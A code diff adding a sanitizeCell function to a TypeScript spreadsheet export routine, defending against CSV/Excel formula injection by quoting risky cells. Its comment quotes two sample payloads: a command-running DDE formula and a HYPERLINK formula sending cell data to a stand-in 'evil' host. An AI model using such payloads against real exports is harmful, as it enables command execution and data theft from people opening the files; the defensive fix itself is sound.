@@ -23,10 +23,26 @@ function buildAoa<T>(rows: T[], columns: ExportColumn<T>[]): (string | number | 
   const body = rows.map((row) =>
     columns.map((c) => {
       const v = c.value(row);
-      return v === null || v === undefined ? "" : v;
+      return v === null || v === undefined ? "" : sanitizeCell(v);
     })
   );
   return [header, ...body];
+}
+
+// Guards against CSV/Excel "formula injection" (a well-known class of
+// vulnerability): if any user-entered field (a student/vendor/staff name,
+// notice text, etc.) starts with =, +, -, @, or a tab/CR, Excel treats the
+// cell as a FORMULA when the file is opened -- which can run arbitrary
+// commands (e.g. =cmd|'/c calc'!A1) or exfiltrate data (e.g.
+// =HYPERLINK("http://evil/"&A1)) against whoever opens the exported file.
+// Prefixing with a single quote keeps Excel/Sheets treating it as plain
+// text while leaving the visible value unchanged for the user.
+function sanitizeCell(value: string | number | boolean): string | number | boolean {
+  if (typeof value !== "string") return value;
+  if (/^[=+\-@\t\r]/.test(value)) {
+    return `'${value}`;
+  }
+  return value;
 }
 
 function triggerDownload(blob: Blob, filename: string) {
